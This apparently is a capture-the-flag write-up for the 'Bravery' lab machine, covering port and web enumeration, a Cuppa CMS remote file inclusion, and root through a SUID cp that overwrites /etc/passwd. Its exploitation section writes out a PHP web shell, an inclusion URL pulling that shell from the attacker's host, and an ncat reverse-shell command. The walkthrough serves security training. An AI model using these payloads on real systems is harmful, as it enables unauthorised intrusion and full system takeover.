@@ -1,0 +1,299 @@
+I"9^<p>This is a linux machine that requires detailed enumeration to access to other resources, Cuppa CMS vulnerable to Local/Remote File Inclusion allowed me to gain access to the server, and abuse SUID permissions to get root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We start by discovering the target host with a ping scan as shown below:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24  
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-20 15:14 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.129
+Host is up <span class="o">(</span>0.00059s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:0C:29:D0:FA:E4 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.254
+Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:50:56:EB:CB:4D <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.1
+Host is up.
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.35 seconds
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Discover the target, our next goal is to find open ports, for this we will do a TCP port scan with nmap.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">--open</span> 192.168.179.129 <span class="nt">-oG</span> nmap-all-tcp-ports
+...
+Not shown: 65522 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+2049/tcp  open  nfs
+3306/tcp  open  mysql
+8080/tcp  open  http-proxy
+20048/tcp open  mountd
+38849/tcp open  unknown
+42475/tcp open  unknown
+MAC Address: 00:0C:29:D0:FA:E4 <span class="o">(</span>VMware<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>A large number of open ports were found, we will proceed to perform the version and service enumeration with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,53,80,111,139,443,445,2049,3306,8080,20048,38849,42475 192.168.179.129 <span class="nt">-oN</span> tcp-service-enum
+...
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp    open  domain      dnsmasq 2.76
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.76
+80/tcp    open  http        Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16<span class="o">)</span>
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16
+|_http-title: Apache HTTP Server Test Page powered by CentOS
+111/tcp   open  rpcbind     2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100003  3,4         2049/udp   nfs
+|   100003  3,4         2049/udp6  nfs
+|   100005  1,2,3      20048/tcp   mountd
+|   100005  1,2,3      20048/tcp6  mountd
+|   100005  1,2,3      20048/udp   mountd
+|   100005  1,2,3      20048/udp6  mountd
+|   100021  1,3,4      38849/tcp   nlockmgr
+|   100021  1,3,4      45542/tcp6  nlockmgr
+|   100021  1,3,4      52880/udp6  nlockmgr
+|   100021  1,3,4      56837/udp   nlockmgr
+|   100024  1          40998/tcp6  status
+|   100024  1          42475/tcp   status
+|   100024  1          47099/udp   status
+|   100024  1          60525/udp6  status
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+443/tcp   open  ssl/http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16<span class="o">)</span>
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/5.4.16
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span><span class="nt">--</span>
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost.localdomain/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span><span class="nt">--</span>
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2018-06-10T15:53:25
+| Not valid after:  2019-06-10T15:53:25
+| MD5:   0fa7 c8d5 15ec c28f e37a df78 dcf6 b49f
+|_SHA-1: 1c6d ee6d 1ab8 06c0 a8bf da93 2a6f f0f1 b758 5284
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>445/tcp   open  netbios-ssn Samba smbd 4.7.1 <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+2049/tcp  open  nfs_acl     3 <span class="o">(</span>RPC <span class="c">#100227)</span>
+3306/tcp  open  mysql       MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>
+8080/tcp  open  http        nginx 1.12.2
+| http-methods: 
+|_  Supported Methods: GET HEAD
+| http-robots.txt: 4 disallowed entries 
+|_/cgi-bin/ /qwertyuiop.html /private /public
+|_http-server-header: nginx/1.12.2
+|_http-title: Welcome to Bravery! This is SPARTA!
+20048/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+38849/tcp open  nlockmgr    1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
+42475/tcp open  status      1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+MAC Address: 00:0C:29:D0:FA:E4 <span class="o">(</span>VMware<span class="o">)</span>
+Service Info: Host: BRAVERY
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p><strong>Web service on port 80</strong></p>
+
+<p>We start by enumerating hidden files and directories with gobuster as shown in the following syntax:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.129/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
+...
+http://192.168.179.129/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
+http://192.168.179.129/1                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/2                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/3                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/4                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/contactus            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 27]
+http://192.168.179.129/5                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/6                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/7                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/9                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/0                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2] 
+http://192.168.179.129/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 239] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129/uploads/]
+http://192.168.179.129/8                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 30]                                       
+
+</code></pre></div></div>
+<p>From the result obtained, the request to the following URL we get a message mentioning that ports 80 and 8080 are best friends, somehow this gives me to understand that these ports may be related in a certein way.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/8
+</code></pre></div></div>
+<p><img src="/assets/images/bravery/screenshot-1.png" alt="" /></p>
+
+<p>In the following request we find a note specifying about a cuppa CMS account.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/uploads/files/internal/department/procurement/sara/note.txt
+</code></pre></div></div>
+<p><img src="/assets/images/bravery/screenshot-2.png" alt="" /></p>
+
+<p><strong>Web service on port 8080</strong></p>
+
+<p>Then we enumerate with gobuster the web service running on port 8080.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.129:8080/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span>
+...
+http://192.168.179.129:8080/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 503]
+http://192.168.179.129:8080/public               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129:8080/public/]
+http://192.168.179.129:8080/private              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 185] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129:8080/private/]
+
+</code></pre></div></div>
+<p>When we access the <strong>public</strong> directory we find with a web page, but we didn’t find anything interesting.</p>
+
+<p><img src="/assets/images/bravery/screenshot-3.png" alt="" /></p>
+
+<p>Then I proceed to create a dictionary with cewl, and we generate a combinations series with john, to then enumerate possible hidden files and directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>cewl http://192.168.179.129:8080/public <span class="nt">-w</span> cewl-domain-list.txt 
+root@kali:~/bravery<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>cewl-domain-list.txt <span class="nt">--rules</span> <span class="nt">--stdout</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> cewl-final-list.txt
+</code></pre></div></div>
+
+<p><strong>Re-enumerating Port 80</strong></p>
+
+<p>After enumerating on port 8080 with the dictionary created with cewl, and finding nothing I head to enumerating on the port 80 and found the following directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.129 <span class="nt">-w</span> cewl-final-list.txt <span class="nt">-e</span>
+...
+http://192.168.179.129/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
+http://192.168.179.129/about?               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 79]
+http://192.168.179.129/genevieve            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 241] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129/genevieve/]
+http://192.168.179.129/Genevieve            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 265]                                         
+http://192.168.179.129/Genevieve?           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 265]                                         
+http://192.168.179.129/genevieve?           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 242] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.129/genevieve/?]
+
+</code></pre></div></div>
+<p><strong>Corporate web page</strong></p>
+
+<p>Requesting the resource <strong>genevieve</strong>, I find another web page, I start browsing the site and in the tab <strong>Internal Use Only</strong> in the option <strong>Knowledge Management</strong> it redirects us at the Cuppa CMS.</p>
+
+<p><img src="/assets/images/bravery/screenshot-4.png" alt="" /></p>
+
+<p><img src="/assets/images/bravery/screenshot-5.png" alt="" /></p>
+
+<p>Then we search in searchsploit for vulnerabilities in this CMS, and I find a possible Local/Remote File Inclusion vulnerability for Cuppa CMS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>searchsploit cuppa
+<span class="nt">------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+ Exploit Title                                                                            |  Path
+<span class="nt">------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+Cuppa CMS - <span class="s1">'/alertConfigField.php'</span> Local/Remote File Inclusion                           | php/webapps/25971.txt
+<span class="nt">------------------------------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
+</code></pre></div></div>
+<p>I transfer a copy of this exploit to my current working directory, and see that it can be exploited for local and remote file inclusion.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/25971.txt
+root@kali:~/bravery<span class="nv">$ </span><span class="nb">cat </span>25971.txt
+...
+http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class="o">=</span>http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig<span class="o">=</span>../../../../../../../../../etc/passwd
+...
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="remote-file-inclusion">Remote File Inclusion</h3>
+<p>I start the apache service and redirect a simple web shell to web root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>systemctl start apache2.service 
+root@kali:~/bravery<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"&lt;?php passthru(</span><span class="se">\$</span><span class="s2">_GET['cmd']); ?&gt;"</span> <span class="o">&gt;</span> /var/www/html/back.txt
+</code></pre></div></div>
+<p>Then I include the webshell that’s hosted on my local server and we execute the command <strong>id</strong>, as  shown below:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig<span class="o">=</span>http://192.168.179.1/back.txt&amp;cmd<span class="o">=</span><span class="nb">id</span>
+</code></pre></div></div>
+<p><img src="/assets/images/bravery/screenshot-6.png" alt="" /></p>
+
+<p>We check if the tool <strong>ncat</strong> exists, in order to obtain an encrypted shell from the victim machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig<span class="o">=</span>http://192.168.179.1/back.txt&amp;cmd<span class="o">=</span>which%20ncat
+</code></pre></div></div>
+<p><img src="/assets/images/bravery/screenshot-7.png" alt="" /></p>
+
+<p><strong>Getting a reverse shell</strong></p>
+
+<p>We start a listener with <strong>ncat</strong> on port 443.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 <span class="nt">--ssl</span>
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Generating a temporary 2048-bit RSA key. Use <span class="nt">--ssl-key</span> and <span class="nt">--ssl-cert</span> to use a permanent one.
+Ncat: SHA-1 fingerprint: B8AD 2215 76EA E761 6B75 9B68 FB2A 48B2 7067 4C38
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+</code></pre></div></div>
+<p>Then we execute with curl the following request that will establish a connection with the attacking machine and execute the linux bash.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.179.1/back.txt&amp;cmd=ncat%20192.168.179.1%20443%20-e%20/bin/bash%20--ssl"</span>
+</code></pre></div></div>
+<p>We got a shell with limited permissions and I used python to spawn a TTY shell, as shown below.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443 <span class="nt">--ssl</span>
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Generating a temporary 2048-bit RSA key. Use <span class="nt">--ssl-key</span> and <span class="nt">--ssl-cert</span> to use a permanent one.
+Ncat: SHA-1 fingerprint: B8AD 2215 76EA E761 6B75 9B68 FB2A 48B2 7067 4C38
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 192.168.179.129.
+Ncat: Connection from 192.168.179.129:39134.
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+bash-4.2<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux bravery 3.10.0-862.3.2.el7.x86_64 <span class="c">#1 SMP Mon May 21 23:36:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-privileges">SUID Privileges</h3>
+<p>Listing SUID permissions, I found the <strong>cat</strong> command which is potentially dangerous, wich we will take advantage of to escalate privileges.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/usr/bin/cp
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/chage
+...
+</code></pre></div></div>
+<p>Located in the directory <strong>temp</strong> redirect the content of <strong>/etc/passwd</strong> to a file in the current directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">cd</span> /tmp
+bash-4.2<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> passwd
+</code></pre></div></div>
+<p>On the attacking machine we generate a password hash with <strong>openssl</strong>, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/bravery<span class="nv">$ </span>openssl passwd <span class="nt">-1</span> br4vR00t
+<span class="nv">$1$um05ZRrH$2I3eWNoc</span>.MLsPEoEp1LCM.
+</code></pre></div></div>
+<p>Then we create the <em>s4rgaz</em> user and redirect to the <strong>passwd</strong> file in the current directory, we verify that the user was created, we copy the <strong>passwd</strong> file to <strong>/etc/passwd</strong>, we change to the <em>s4rgaz</em> user providing the password and we got root.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'s4rgasz$1$um05ZRrH$2I3eWNoc.MLsPEoEp1LCM.:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> passwd
+bash-4.2<span class="nv">$ </span><span class="nb">tail</span> <span class="nt">-2</span> passwd
+rick:x:1004:1004::/home/rick:/bin/bash
+s4rgaz:<span class="nv">$1$um05ZRrH$2I3eWNoc</span>.MLsPEoEp1LCM.:0:0:root:/root:/bin/bash
+bash-4.2<span class="nv">$ </span><span class="nb">cp </span>passwd /etc/passwd
+bash-4.2<span class="nv">$ </span>su s4rgaz
+Password: br4vR00t
+<span class="o">[</span>root@bravery tmp]# <span class="nb">whoami
+</span>root
+<span class="o">[</span>root@bravery tmp]# <span class="nb">cat</span> ~/proof.txt
+Congratulations on rooting BRAVERY. :<span class="o">)</span>
+</code></pre></div></div>
+:ET
